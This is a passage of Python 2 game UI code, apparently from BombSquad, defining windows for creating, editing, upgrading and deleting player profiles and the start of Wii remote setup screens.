            # upgrade transaction, and then sit and wait for everything to
            # go through..
            editProfileWindow = self._editProfileWindow()
            if editProfileWindow is None:
                print 'profile upgrade: original edit window gone'
                return
            success = editProfileWindow.save(transitionOut=False)
            if not success:
                print 'profile upgrade: error occurred saving profile'
                bs.screenMessage(bs.Lstr(resource='errorText'), color=(1, 0, 0))
                bs.playSound(bs.getSound('error'))
                return
            bsInternal._addTransaction({'type': 'UPGRADE_PROFILE',
                                        'name': self._name})
            bsInternal._runTransactions()
            self._status = 'upgrading'
            self._upgradeStartTime = time.time()
        else:
            bs.playSound(bs.getSound('error'))

    def _update(self):
        try:
            tStr = str(bsInternal._getAccountTicketCount())
        except Exception:
            tStr = '?'
        if self._ticketsText is not None:
            bs.textWidget(
                edit=self._ticketsText, text=bs.Lstr(
                    resource='getTicketsWindow.youHaveShortText',
                    subs=[('${COUNT}', bs.getSpecialChar('ticket') + tStr)]))

        # once we've kicked off an upgrade attempt and all transactions go
        # through, we're done
        if (self._status == 'upgrading'
                and not bsInternal._haveOutstandingTransactions()):
            self._status = 'exiting'
            bs.containerWidget(edit=self._rootWidget, transition='outRight')
            editProfileWindow = self._editProfileWindow()
            if editProfileWindow is None:
                print 'profile upgrade transition out: original edit window gone'
                return
            bs.playSound(bs.getSound('gunCocking'))
            editProfileWindow.reloadWindow()

    def _cancel(self):
        # if we recently sent out an upgrade request, disallow canceling
        # for a bit.
        if (self._upgradeStartTime is not None
                and time.time() - self._upgradeStartTime < 10.0):
            bs.playSound(bs.getSound('error'))
            return
        bs.containerWidget(edit=self._rootWidget, transition='outRight')


class EditProfileWindow(Window):

    def reloadWindow(self):
        # kinda hacky for now - we just transition out and recreate ourself..
        bs.containerWidget(edit=self._rootWidget, transition='outLeft')
        uiGlobals['mainMenuWindow'] = EditProfileWindow(
            self.getName(), self._inMainMenu).getRootWidget()

    def __init__(self, existingProfile, inMainMenu, transition='inRight'):

        import bsMainMenu

        self._inMainMenu = inMainMenu
        self._existingProfile = existingProfile

        self._r = 'editProfileWindow'

        # grab profile colors or pick random ones
        self._color, self._highlight = bsUtils.getPlayerProfileColors(
            existingProfile)
        self._width = width = 780 if gSmallUI else 680
        self._xInset = xInset = 50 if gSmallUI else 0
        self._height = height = 350 if gSmallUI else 400 if gMedUI else 450
        spacing = 40
        buttonWidth = 350
        self._baseScale = 2.05 if gSmallUI else 1.5 if gMedUI else 1.0

        topExtra = 15 if gSmallUI else 15
        self._rootWidget = bs.containerWidget(
            size=(width, height + topExtra),
            transition=transition, scale=self._baseScale, stackOffset=(0, 15)
            if gSmallUI else(0, 0))
        cancelButton = b = bs.buttonWidget(
            parent=self._rootWidget, position=(52 + xInset, height - 60),
            size=(155, 60),
            scale=0.8, autoSelect=True, label=bs.Lstr(
                resource='cancelText'),
            onActivateCall=self._cancel)
        bs.containerWidget(edit=self._rootWidget, cancelButton=b)
        saveButton = b = bs.buttonWidget(
            parent=self._rootWidget,
            position=(width - (177 + xInset),
                      height - 60),
            size=(155, 60),
            autoSelect=True, scale=0.8, label=bs.Lstr(resource='saveText'))
        bs.widget(edit=saveButton, leftWidget=cancelButton)
        bs.widget(edit=cancelButton, rightWidget=saveButton)
        bs.containerWidget(edit=self._rootWidget, startButton=b)
        t = bs.textWidget(
            parent=self._rootWidget, position=(self._width * 0.5, height - 38),
            size=(0, 0),
            text=(bs.Lstr(resource=self._r + '.titleNewText')
                  if existingProfile is None else bs.Lstr(
                      resource=self._r + '.titleEditText')),
            color=gTitleColor, maxWidth=290, scale=1.0, hAlign="center",
            vAlign="center")

        # make a list of spaz icons
        self.refreshCharacters()
        try:
            profile = bs.getConfig()['Player Profiles'][self._existingProfile]
        except Exception:
            profile = {}

        if 'global' in profile:
            self._global = profile['global']
        else:
            self._global = False

        if 'icon' in profile:
            self._icon = profile['icon']
        else:
            self._icon = bs.getSpecialChar('logo')

        assignedRandomChar = False

        # look for existing character choice or pick random one otherwise
        try:
            iconIndex = self._spazzes.index(profile['character'])
        except Exception:
            # lets set the default icon to spaz for our first profile; after
            # that we go random
            # (SCRATCH THAT.. we now hard-code account-profiles to start with
            # spaz which has a similar effect)
            # try: pLen = len(bs.getConfig()['Player Profiles'])
            # except Exception: pLen = 0
            # if pLen == 0: iconIndex = self._spazzes.index('Spaz')
            # else:
            random.seed()
            iconIndex = random.randrange(len(self._spazzes))
            assignedRandomChar = True
        self._iconIndex = iconIndex
        bs.buttonWidget(edit=saveButton, onActivateCall=lambda: self.save())

        v = height - 115

        self._name = (u'' if self._existingProfile is None
                      else self._existingProfile)
        self._isAccountProfile = (self._name == '__account__')

        # if we just picked a random character, see if it has specific
        # colors/highlights associated with it and assign them if so..
        if assignedRandomChar:
            c = bsSpaz.appearances[self._spazzes[iconIndex]].defaultColor
            if c is not None:
                self._color = c
            h = bsSpaz.appearances[self._spazzes[iconIndex]].defaultHighlight
            if h is not None:
                self._highlight = h

        # assign a random name if they had none..
        if self._name == '':
            names = bsInternal._getRandomNames()
            self._name = names[random.randrange(len(names))]

        self._clippedNameText = bs.textWidget(
            parent=self._rootWidget, text='', position=(540 + xInset, v - 8),
            flatness=1.0, shadow=0.0, scale=0.55, size=(0, 0),
            maxWidth=100, hAlign='center', vAlign='center', color=(1, 1, 0,
                                                                   0.5))

        if not self._isAccountProfile and not self._global:
            bs.textWidget(
                parent=self._rootWidget, text=bs.Lstr(
                    resource=self._r + '.nameText'),
                position=(200 + xInset, v - 6),
                size=(0, 0),
                hAlign='right', vAlign='center', color=(1, 1, 1, 0.5),
                scale=0.9)

        self._upgradeButton = None
        if self._isAccountProfile:
            if bsInternal._getAccountState() == 'SIGNED_IN':
                s = bsInternal._getAccountDisplayString()
            else:
                s = '??'
            bs.textWidget(
                parent=self._rootWidget, position=(self._width * 0.5, v - 7),
                size=(0, 0),
                scale=1.2, text=s, maxWidth=270, hAlign='center',
                vAlign='center')
            txt = bs.Lstr(
                resource='editProfileWindow.accountProfileText').evaluate()
            bWidth = min(270, bsInternal._getStringWidth(
                txt, suppressWarning=True) * 0.6)
            bs.textWidget(
                parent=self._rootWidget, position=(self._width * 0.5, v - 39),
                size=(0, 0),
                scale=0.6, color=gInfoTextColor, text=txt, maxWidth=270,
                hAlign='center', vAlign='center')
            self._accountTypeInfoButton = bs.buttonWidget(
                parent=self._rootWidget, label='?', size=(15, 15),
                textScale=0.6,
                position=(self._width * 0.5 + bWidth * 0.5 + 13, v - 47),
                buttonType='square', color=(0.6, 0.5, 0.65),
                autoSelect=True, onActivateCall=self.showAccountProfileInfo)
        elif self._global:

            bSize = 60
            self._iconButton = b = bs.buttonWidget(
                parent=self._rootWidget, autoSelect=True,
                position=(self._width * 0.5 - 160 - bSize * 0.5, v - 38 - 15),
                size=(bSize, bSize),
                color=(0.6, 0.5, 0.6),
                label='', buttonType='square', textScale=1.2,
                onActivateCall=self._onIconPress)
            self._iconButtonLabel = bs.textWidget(
                parent=self._rootWidget,
                position=(self._width * 0.5 - 160, v - 35),
                drawController=b, hAlign='center', vAlign='center', size=(0, 0),
                color=(1, 1, 1),
                text='', scale=2.0)

            bs.textWidget(
                parent=self._rootWidget, hAlign='center', vAlign='center',
                position=(self._width * 0.5 - 160, v - 55 - 15),
                size=(0, 0),
                drawController=b, text=bs.Lstr(
                    resource=self._r + '.iconText'),
                scale=0.7, color=gTitleColor, maxWidth=120)

            self._updateIcon()

            bs.textWidget(parent=self._rootWidget,
                          position=(self._width * 0.5, v - 7),
                          size=(0, 0),
                          scale=1.2, text=self._name, maxWidth=240,
                          hAlign='center', vAlign='center')
            # FIXME hard coded strings are bad
            txt = bs.Lstr(
                resource='editProfileWindow.globalProfileText').evaluate()
            bWidth = min(240, bsInternal._getStringWidth(
                txt, suppressWarning=True) * 0.6)
            bs.textWidget(
                parent=self._rootWidget, position=(self._width * 0.5, v - 39),
                size=(0, 0),
                scale=0.6, color=gInfoTextColor, text=txt, maxWidth=240,
                hAlign='center', vAlign='center')
            self._accountTypeInfoButton = bs.buttonWidget(
                parent=self._rootWidget, label='?', size=(15, 15),
                textScale=0.6,
                position=(self._width * 0.5 + bWidth * 0.5 + 13, v - 47),
                buttonType='square', color=(0.6, 0.5, 0.65),
                autoSelect=True, onActivateCall=self.showGlobalProfileInfo)
        else:
            self._textField = bs.textWidget(
                parent=self._rootWidget, position=(220 + xInset, v - 30),
                size=(265, 40),
                text=self._name, hAlign='left', vAlign='center', maxChars=16,
                description=bs.Lstr(
                    resource=self._r + '.nameDescriptionText'),
                autoSelect=True, editable=True, padding=4,
                color=(0.9, 0.9, 0.9, 1.0),
                onReturnPressCall=bs.Call(saveButton.activate))
            # FIXME hard coded strings are bad
            txt = bs.Lstr(
                resource='editProfileWindow.localProfileText').evaluate()
            bWidth = min(270, bsInternal._getStringWidth(
                txt, suppressWarning=True) * 0.6)
            bs.textWidget(
                parent=self._rootWidget, position=(self._width * 0.5, v - 43),
                size=(0, 0),
                scale=0.6, color=gInfoTextColor, text=txt, maxWidth=270,
                hAlign='center', vAlign='center')
            self._accountTypeInfoButton = bs.buttonWidget(
                parent=self._rootWidget, label='?', size=(15, 15),
                textScale=0.6,
                position=(self._width * 0.5 + bWidth * 0.5 + 13, v - 50),
                buttonType='square', color=(0.6, 0.5, 0.65),
                autoSelect=True, onActivateCall=self.showLocalProfileInfo)
            self._upgradeButton = bs.buttonWidget(
                parent=self._rootWidget, label=bs.Lstr(
                    resource='upgradeText'),
                size=(40, 17),
                textScale=1.0, buttonType='square',
                position=(self._width * 0.5 + bWidth * 0.5 + 13 + 43, v - 51),
                color=(0.6, 0.5, 0.65),
                autoSelect=True, onActivateCall=self.upgradeProfile)

        self._updateClippedName()
        self._clippedNameTimer = bs.Timer(
            333, bs.WeakCall(self._updateClippedName),
            timeType='real', repeat=True)

        v -= spacing * 3.0

        h = 256
        bSize = 80
        bSize2 = 100
        bOffs = 150

        imgSize = 100
        self._colorButton = b = bs.buttonWidget(
            parent=self._rootWidget, autoSelect=True,
            position=(self._width * 0.5 - bOffs - bSize * 0.5, v - 50),
            size=(bSize, bSize),
            color=self._color, label='', buttonType='square')
        origin = self._colorButton.getScreenSpaceCenter()
        bs.buttonWidget(edit=self._colorButton, onActivateCall=bs.WeakCall(
            self._makePicker, 'color', origin))
        bs.textWidget(
            parent=self._rootWidget, hAlign='center', vAlign='center',
            position=(self._width * 0.5 - bOffs, v - 65),
            size=(0, 0),
            drawController=b, text=bs.Lstr(resource=self._r + '.colorText'),
            scale=0.7, color=gTitleColor, maxWidth=120)

        self._characterButton = b = bs.buttonWidget(
            parent=self._rootWidget, autoSelect=True,
            position=(self._width * 0.5 - bSize2 * 0.5, v - 60),
            upWidget=self._accountTypeInfoButton,
            onActivateCall=self._onCharacterPress, size=(bSize2, bSize2),
            label='', color=(1, 1, 1),
            maskTexture=bs.getTexture('characterIconMask'))
        if not self._isAccountProfile and not self._global:
            bs.containerWidget(edit=self._rootWidget,
                               selectedChild=self._textField)
        bs.textWidget(
            parent=self._rootWidget, hAlign='center', vAlign='center',
            position=(self._width * 0.5, v - 80),
            size=(0, 0),
            drawController=b, text=bs.Lstr(
                resource=self._r + '.characterText'),
            scale=0.7, color=gTitleColor, maxWidth=130)

        y = v-60
        self._highlightButton = b = bs.buttonWidget(
            parent=self._rootWidget, autoSelect=True,
            position=(self._width * 0.5 + bOffs - bSize * 0.5, v - 50),
            upWidget=self._upgradeButton
            if self._upgradeButton is not None else self._accountTypeInfoButton,
            size=(bSize, bSize),
            color=self._highlight, label='', buttonType='square')

        if not self._isAccountProfile and not self._global:
            bs.widget(edit=cancelButton, downWidget=self._textField)
            bs.widget(edit=saveButton, downWidget=self._textField)
            bs.widget(edit=self._colorButton, upWidget=self._textField)
        bs.widget(edit=self._accountTypeInfoButton,
                  downWidget=self._characterButton)

        origin = self._highlightButton.getScreenSpaceCenter()
        bs.buttonWidget(edit=self._highlightButton, onActivateCall=bs.WeakCall(
            self._makePicker, 'highlight', origin))
        bs.textWidget(
            parent=self._rootWidget, hAlign='center', vAlign='center',
            position=(self._width * 0.5 + bOffs, v - 65),
            size=(0, 0),
            drawController=b, text=bs.Lstr(
                resource=self._r + '.highlightText'),
            scale=0.7, color=gTitleColor, maxWidth=120)
        self._updateCharacter()

    def upgradeProfile(self):
        if bsInternal._getAccountState() != 'SIGNED_IN':
            showSignInPrompt()
            return

        UpgradeProfileWindow(self)

    def showAccountProfileInfo(self):
        iconsStr = ' '.join(
            [bs.getSpecialChar(n)
             for n
             in
             ['googlePlusLogo', 'gameCenterLogo', 'gameCircleLogo', 'ouyaLogo',
              'localAccount', 'alibabaLogo', 'oculusLogo', 'nvidiaLogo']])
        txt = bs.Lstr(
            resource='editProfileWindow.accountProfileInfoText',
            subs=[('${ICONS}', iconsStr)])
        ConfirmWindow(
            txt, cancelButton=False, width=500, height=300,
            originWidget=self._accountTypeInfoButton)

    def showLocalProfileInfo(self):
        txt = bs.Lstr(resource='editProfileWindow.localProfileInfoText')
        ConfirmWindow(
            txt, cancelButton=False, width=600, height=250,
            originWidget=self._accountTypeInfoButton)

    def showGlobalProfileInfo(self):
        txt = bs.Lstr(resource='editProfileWindow.globalProfileInfoText')
        ConfirmWindow(
            txt, cancelButton=False, width=600, height=250,
            originWidget=self._accountTypeInfoButton)

    def refreshCharacters(self):
        self._spazzes = bsSpaz.getAppearances()
        self._spazzes.sort()
        self._iconTextures = [
            bs.getTexture(bsSpaz.appearances[s].iconTexture)
            for s in self._spazzes]
        self._iconTintTextures = [
            bs.getTexture(bsSpaz.appearances[s].iconMaskTexture)
            for s in self._spazzes]

    def onIconPickerPick(self, icon):
        self._icon = icon
        self._updateIcon()

    def onCharacterPickerPick(self, character):
        if not self._rootWidget.exists():
            return
        # the player could have bought a new one while the picker was up..
        self.refreshCharacters()
        self._iconIndex = self._spazzes.index(
            character) if character in self._spazzes else 0
        self._updateCharacter()

    def _onCharacterPress(self):
        picker = CharacterPicker(
            parent=self._rootWidget,
            position=self._characterButton.getScreenSpaceCenter(),
            selectedCharacter=self._spazzes[self._iconIndex],
            delegate=self, tintColor=self._color, tint2Color=self._highlight)

    def _onIconPress(self):
        picker = IconPicker(parent=self._rootWidget,
                            position=self._iconButton.getScreenSpaceCenter(),
                            selectedIcon=self._icon,
                            delegate=self,
                            tintColor=self._color,
                            tint2Color=self._highlight)

    def _makePicker(self, pickerType, origin):
        if pickerType == 'color':
            initialColor = self._color
        elif pickerType == 'highlight':
            initialColor = self._highlight
        else:
            raise Exception("invalid pickerType: "+pickerType)
        ColorPicker(
            parent=self._rootWidget, position=origin,
            offset=(self._baseScale *
                    (-100 if pickerType == 'color' else 100),
                    0),
            initialColor=initialColor, delegate=self, tag=pickerType)

    def _cancel(self):
        bs.containerWidget(edit=self._rootWidget, transition='outRight')
        uiGlobals['mainMenuWindow'] = PlayerProfilesWindow(
            'inLeft', selectedProfile=self._existingProfile,
            inMainMenu=self._inMainMenu).getRootWidget()

    def _setColor(self, color):
        self._color = color
        if self._colorButton.exists():
            bs.buttonWidget(edit=self._colorButton, color=color)

    def _setHighlight(self, color):
        self._highlight = color
        if self._highlightButton.exists():
            bs.buttonWidget(edit=self._highlightButton, color=color)

    def colorPickerClosing(self, picker):
        if not self._rootWidget.exists():
            return
        tag = picker.getTag()
        if tag == 'color':
            bs.containerWidget(edit=self._rootWidget,
                               selectedChild=self._colorButton)
        elif tag == 'highlight':
            bs.containerWidget(edit=self._rootWidget,
                               selectedChild=self._highlightButton)
        else:
            print 'colorPickerClosing got unknown tag '+str(tag)

    def colorPickerSelectedColor(self, picker, color):
        if not self._rootWidget.exists():
            return
        tag = picker.getTag()
        if tag == 'color':
            self._setColor(color)
        elif tag == 'highlight':
            self._setHighlight(color)
        else:
            print 'colorPickerSelectedColor got unknown tag '+str(tag)
        self._updateCharacter()

    def _updateClippedName(self):
        if not self._clippedNameText.exists():
            return
        name = self.getName()
        if name == '__account__':
            name = bsInternal._getAccountName(
            ) if bsInternal._getAccountState() == 'SIGNED_IN' else '???'
        nameChars = bs.uniToInts(name)
        if len(nameChars) > 10 and not (self._global or self._isAccountProfile):
            bs.textWidget(
                edit=self._clippedNameText, text=bs.Lstr(
                    resource='inGameClippedNameText',
                    subs=[('${NAME}', bs.uniFromInts(nameChars[: 10]) + '...')]
                ))
        else:
            bs.textWidget(edit=self._clippedNameText, text='')

    def _updateCharacter(self, change=0):
        self._iconIndex = (self._iconIndex + change) % len(self._spazzes)
        if self._characterButton.exists():
            bs.buttonWidget(edit=self._characterButton,
                            texture=self._iconTextures[self._iconIndex],
                            tintTexture=self._iconTintTextures[self._iconIndex],
                            tintColor=self._color,
                            tint2Color=self._highlight)

    def _updateIcon(self):
        if self._iconButtonLabel.exists():
            bs.textWidget(edit=self._iconButtonLabel, text=self._icon)

    def getName(self):
        if self._isAccountProfile:
            newName = '__account__'
        elif self._global:
            newName = self._name
        else:
            newName = bs.textWidget(query=self._textField)
        return newName

    def save(self, transitionOut=True):
        bsConfig = bs.getConfig()
        newName = self.getName().strip()

        if len(newName) == 0:
            bs.screenMessage(bs.Lstr(resource='nameNotEmptyText'))
            bs.playSound(bs.getSound('error'))
            return False

        if transitionOut:
            bs.playSound(bs.getSound('gunCocking'))

        # delete old in case we're renaming
        if self._existingProfile and self._existingProfile != newName:
            bsInternal._addTransaction({'type': 'REMOVE_PLAYER_PROFILE',
                                        'name': self._existingProfile})
            # also lets be aware we're no longer global if we're taking a
            # new name (will need to re-request it)
            self._global = False

        bsInternal._addTransaction({
            'type': 'ADD_PLAYER_PROFILE',
            'name': newName,
            'profile': {'character': self._spazzes[self._iconIndex],
                        'color': self._color,
                        'global': self._global,
                        'icon': self._icon,
                        'highlight': self._highlight}})

        if transitionOut:
            bsInternal._runTransactions()
            bs.containerWidget(edit=self._rootWidget, transition='outRight')
            uiGlobals['mainMenuWindow'] = PlayerProfilesWindow(
                'inLeft', selectedProfile=newName,
                inMainMenu=self._inMainMenu).getRootWidget()
        return True


class PlayerProfilesWindow(Window):

    def __init__(self, transition='inRight', inMainMenu=True,
                 selectedProfile=None, originWidget=None):

        self._inMainMenu = inMainMenu
        if self._inMainMenu:
            backLabel = bs.Lstr(resource='backText')
        else:
            backLabel = bs.Lstr(resource='doneText')
        self._width = 700 if gSmallUI else 600
        xInset = 50 if gSmallUI else 0
        self._height = 360 if gSmallUI else 385 if gMedUI else 410
        spacing = 40
        buttonWidth = 350

        # if we're being called up standalone, handle pause/resume ourself
        if not self._inMainMenu:
            pause()

        # if they provided an origin-widget, scale up from that
        if originWidget is not None:
            self._transitionOut = 'outScale'
            scaleOrigin = originWidget.getScreenSpaceCenter()
            transition = 'inScale'
        else:
            self._transitionOut = 'outRight'
            scaleOrigin = None

        self._r = 'playerProfilesWindow'

        # ensure we've got an account-profile in cases where we're signed in
        bsUtils._ensureHaveAccountPlayerProfile()

        topExtra = 20 if gSmallUI else 0
        self._rootWidget = bs.containerWidget(
            size=(self._width, self._height + topExtra),
            transition=transition, scaleOriginStackOffset=scaleOrigin,
            scale=2.2 if gSmallUI else 1.6 if gMedUI else 1.0,
            stackOffset=(0, -14) if gSmallUI else(0, 0))

        self._backButton = b = bs.buttonWidget(
            parent=self._rootWidget, position=(40 + xInset, self._height - 59),
            size=(120, 60),
            scale=0.8, label=backLabel, buttonType='back'
            if self._inMainMenu else None, autoSelect=True,
            onActivateCall=self._back)
        bs.containerWidget(edit=self._rootWidget, cancelButton=b)

        t = bs.textWidget(
            parent=self._rootWidget,
            position=(self._width * 0.5, self._height - 36),
            size=(0, 0),
            text=bs.Lstr(resource=self._r + '.titleText'),
            maxWidth=300, color=gTitleColor, scale=0.9, hAlign="center",
            vAlign="center")

        if self._inMainMenu and gDoAndroidNav:
            bs.buttonWidget(
                edit=b, buttonType='backSmall', size=(60, 60),
                label=bs.getSpecialChar('back'))

        scrollHeight = self._height - 140
        self._scrollWidth = self._width-(188+xInset*2)
        v = self._height - 84
        h = 50 + xInset
        hspacing = 13
        bColor = (0.6, 0.53, 0.63)

        s = 1.055 if gSmallUI else 1.18 if gMedUI else 1.3
        v -= 70.0*s
        self._newButton = b = bs.buttonWidget(
            parent=self._rootWidget, position=(h, v),
            size=(80, 66.0 * s),
            onActivateCall=self._newProfile, color=bColor, buttonType='square',
            autoSelect=True, textColor=(0.75, 0.7, 0.8),
            textScale=0.7, label=bs.Lstr(
                resource=self._r + '.newButtonText'))
        v -= 70.0*s
        self._editButton = b = bs.buttonWidget(
            parent=self._rootWidget, position=(h, v),
            size=(80, 66.0 * s),
            onActivateCall=self._editProfile, color=bColor, buttonType='square',
            autoSelect=True, textColor=(0.75, 0.7, 0.8),
            textScale=0.7, label=bs.Lstr(
                resource=self._r + '.editButtonText'))
        v -= 70.0*s
        self._deleteButton = b = bs.buttonWidget(
            parent=self._rootWidget, position=(h, v),
            size=(80, 66.0 * s),
            onActivateCall=self._deleteProfile, color=bColor,
            buttonType='square', autoSelect=True, textColor=(0.75, 0.7, 0.8),
            textScale=0.7, label=bs.Lstr(
                resource=self._r + '.deleteButtonText'))

        v = self._height - 87

        t = bs.textWidget(
            parent=self._rootWidget,
            position=(self._width * 0.5, self._height - 71),
            size=(0, 0),
            text=bs.Lstr(resource=self._r + '.explanationText'),
            color=gInfoTextColor, maxWidth=self._width * 0.83, scale=0.6,
            hAlign="center", vAlign="center")

        self._scrollWidget = bs.scrollWidget(
            parent=self._rootWidget, highlight=False,
            position=(140 + xInset, v - scrollHeight),
            size=(self._scrollWidth, scrollHeight))
        bs.widget(edit=self._scrollWidget, autoSelect=True,
                  leftWidget=self._newButton)
        bs.containerWidget(edit=self._rootWidget,
                           selectedChild=self._scrollWidget)

        self._columnWidget = bs.columnWidget(parent=self._scrollWidget)
        v -= 255

        self._profiles = None
        self._selectedProfile = selectedProfile
        self._profileWidgets = []

        self._refresh()

        self._restore_state()

    def _newProfile(self):

        # limit to a handful profiles if they don't have pro-options..
        maxNonProProfiles = bsInternal._getAccountMiscReadVal('mnpp', 5)
        if (not bsUtils._haveProOptions()
                and len(self._profiles) >= maxNonProProfiles):
            PurchaseWindow(
                items=['pro'],
                headerText=bs.Lstr(
                    resource='unlockThisProfilesText',
                    subs=[('${NUM}', str(maxNonProProfiles))]))
            return

        # clamp at 100 profiles (otherwise the server will and that's less
        # elegant looking)
        if len(self._profiles) > 100:
            bs.screenMessage(
                bs.Lstr(
                    translate=('serverResponses',
                               'Max number of profiles reached.')),
                color=(1, 0, 0))
            bs.playSound(bs.getSound('error'))
            return

        self._save_state()
        bs.containerWidget(edit=self._rootWidget, transition='outLeft')
        uiGlobals['mainMenuWindow'] = EditProfileWindow(
            existingProfile=None, inMainMenu=self._inMainMenu).getRootWidget()

    def _deleteProfile(self):
        if self._selectedProfile is None:
            bs.playSound(bs.getSound('error'))
            bs.screenMessage(
                bs.Lstr(resource='nothingIsSelectedErrorText'),
                color=(1, 0, 0))
            return
        elif self._selectedProfile == '__account__':
            bs.playSound(bs.getSound('error'))
            bs.screenMessage(
                bs.Lstr(resource=self._r + '.cantDeleteAccountProfileText'),
                color=(1, 0, 0))
            return
        ConfirmWindow(
            bs.Lstr(
                resource=self._r + '.deleteConfirmText',
                subs=[('${PROFILE}', self._selectedProfile)]),
            self._doDeleteProfile, 350)

    def _doDeleteProfile(self):

        bsInternal._addTransaction({'type': 'REMOVE_PLAYER_PROFILE',
                                    'name': self._selectedProfile})
        bsInternal._runTransactions()

        bs.playSound(bs.getSound('shieldDown'))
        self._refresh()
        # select profile list
        bs.containerWidget(edit=self._rootWidget,
                           selectedChild=self._scrollWidget)

    def _editProfile(self):
        if self._selectedProfile is None:
            bs.playSound(bs.getSound('error'))
            bs.screenMessage(
                bs.Lstr(resource='nothingIsSelectedErrorText'),
                color=(1, 0, 0))
            return
        self._save_state()
        bs.containerWidget(edit=self._rootWidget, transition='outLeft')
        uiGlobals['mainMenuWindow'] = EditProfileWindow(
            self._selectedProfile, inMainMenu=self._inMainMenu).getRootWidget()

    def _select(self, name, index):
        self._selectedProfile = name

    def _back(self):
        self._save_state()
        bs.containerWidget(edit=self._rootWidget,
                           transition=self._transitionOut)
        if self._inMainMenu:
            uiGlobals['mainMenuWindow'] = AccountWindow(
                transition='inLeft').getRootWidget()
        # if we're being called up standalone, handle pause/resume ourself
        else:
            resume()

    def _refresh(self):
        oldSelection = self._selectedProfile
        # delete old
        while len(self._profileWidgets) > 0:
            self._profileWidgets.pop().delete()
        try:
            self._profiles = bs.getConfig()['Player Profiles']
        except Exception:
            self._profiles = {}
        items = self._profiles.items()
        # ensure these are unicode..
        items = [(i[0].decode('utf-8'), i[1]) if type(i[0])
                 is not unicode else i for i in items]
        items.sort(key=lambda x: x[0].lower())
        index = 0
        if bsInternal._getAccountState() == 'SIGNED_IN':
            accountName = bsInternal._getAccountDisplayString()
        else:
            accountName = None
        bsConfig = bs.getConfig()
        widgetToSelect = None
        for pName, p in items:
            if pName == '__account__' and accountName is None:
                continue
            color, highlight = bsUtils.getPlayerProfileColors(pName)
            sc = 1.1
            w = bs.textWidget(
                parent=self._columnWidget, position=(0, 32),
                size=((self._width - 40) / sc, 28),
                text=bs.Lstr(
                    value=accountName
                    if pName == '__account__' else bsUtils.getPlayerProfileIcon(
                        pName) + pName),
                hAlign='left', vAlign='center', onSelectCall=bs.WeakCall(
                    self._select, pName, index),
                maxWidth=self._scrollWidth * 0.92, cornerScale=sc,
                color=bs.getSafeColor(color, 0.4),
                alwaysHighlight=True, onActivateCall=bs.Call(
                    self._editButton.activate),
                selectable=True)
            if index == 0:
                bs.widget(edit=w, upWidget=self._backButton)
            bs.widget(edit=w, showBufferTop=40, showBufferBottom=40)
            self._profileWidgets.append(w)

            # select/show this one if it was previously selected
            # (but defer till after this loop since our height is
            # still changing)
            if pName == oldSelection:
                widgetToSelect = w

            index += 1

        if widgetToSelect is not None:
            bs.columnWidget(edit=self._columnWidget,
                            selectedChild=widgetToSelect,
                            visibleChild=widgetToSelect)

        # if there's a team-chooser in existence, tell it the profile-list
        # has probably changed
        session = bsInternal._getForegroundHostSession()
        if session is not None:
            session.handleMessage(bsGame.PlayerProfilesChangedMessage())

    def _save_state(self):
        try:
            sel = self._rootWidget.getSelectedChild()
            if sel == self._newButton:
                selName = 'New'
            elif sel == self._editButton:
                selName = 'Edit'
            elif sel == self._deleteButton:
                selName = 'Delete'
            elif sel == self._scrollWidget:
                selName = 'Scroll'
            else:
                selName = 'Back'
            gWindowStates[self.__class__.__name__] = selName
        except Exception:
            bs.printException('error saving state for', self.__class__)

    def _restore_state(self):
        try:
            try:
                selName = gWindowStates[self.__class__.__name__]
            except Exception:
                selName = None
            if selName == 'Scroll':
                sel = self._scrollWidget
            elif selName == 'New':
                sel = self._newButton
            elif selName == 'Delete':
                sel = self._deleteButton
            elif selName == 'Edit':
                sel = self._editButton
            elif selName == 'Back':
                sel = self._backButton
            else:
                # by default we select our scroll widget if we have profiles;
                # otherwise our new widget
                if len(self._profileWidgets) == 0:
                    sel = self._newButton
                else:
                    sel = self._scrollWidget
            bs.containerWidget(edit=self._rootWidget, selectedChild=sel)
        except Exception:
            bs.printException('error restoring state for', self.__class__)


class ConfigureWiiRemotesWindow(Window):

    def __init__(self):

        self._r = 'wiimoteSetupWindow'
        width = 600
        height = 480
        spacing = 40

        self._rootWidget = bs.containerWidget(
            size=(width, height), transition='inRight')

        b = bs.buttonWidget(
            parent=self._rootWidget, position=(55, height - 50),
            size=(120, 60),
            scale=0.8, autoSelect=True, label=bs.Lstr(resource='backText'),
            buttonType='back', onActivateCall=self._back)

        bs.containerWidget(edit=self._rootWidget, cancelButton=b)

        t = bs.textWidget(
            parent=self._rootWidget, position=(width * 0.5, height - 28),
            size=(0, 0),
            text=bs.Lstr(resource=self._r + '.titleText'),
            maxWidth=270, color=gTitleColor, hAlign="center", vAlign="center")

        if gDoAndroidNav:
            bs.buttonWidget(
                edit=b, buttonType='backSmall', size=(60, 60),
                label=bs.getSpecialChar('back'))

        v = height - 60
        v -= spacing
        t = bs.textWidget(
            parent=self._rootWidget, position=(width * 0.5, v - 80),
            size=(0, 0),
            color=(0.7, 0.9, 0.7, 1.0),
            scale=0.75, text=bs.Lstr(
                resource=self._r + '.macInstructionsText'),
            maxWidth=width * 0.95, maxHeight=height * 0.5, hAlign="center",
            vAlign="center")
        v -= 230
        buttonWidth = 200
        v -= 30
        b = bs.buttonWidget(
            parent=self._rootWidget,
            position=(width / 2 - buttonWidth / 2, v + 1),
            autoSelect=True, size=(buttonWidth, 50),
            label=bs.Lstr(resource=self._r + '.listenText'),
            onActivateCall=WiimoteListenWindow)
        bs.containerWidget(edit=self._rootWidget, startButton=b)
        v -= spacing * 1.1
        t = bs.textWidget(
            parent=self._rootWidget, position=(width * 0.5, v + 10),
            size=(0, 0),
            color=(0.7, 0.9, 0.7, 1.0),
            scale=0.8, maxWidth=width * 0.95, text=bs.Lstr(
                resource=self._r + '.thanksText'),
            hAlign="center", vAlign="center")
        v -= 30
        thisButtonWidth = 200
        b = bs.buttonWidget(
            parent=self._rootWidget,
            position=(width / 2 - thisButtonWidth / 2, v - 14),
            color=(0.45, 0.4, 0.5),
            autoSelect=True, size=(thisButtonWidth, 15),
            label=bs.Lstr(resource=self._r + '.copyrightText'),
            textColor=(0.55, 0.5, 0.6),
            textScale=0.6, onActivateCall=WiimoteLicenseWindow)

    def _back(self):
        bs.containerWidget(edit=self._rootWidget, transition='outRight')
        uiGlobals['mainMenuWindow'] = ControllersWindow(
            transition='inLeft').getRootWidget()


class WiimoteListenWindow(Window):

    def __init__(self):

        self._r = 'wiimoteListenWindow'
        width = 650
        height = 210
        self._rootWidget = bs.containerWidget(
            size=(width, height), transition='inRight')

        b = bs.buttonWidget(
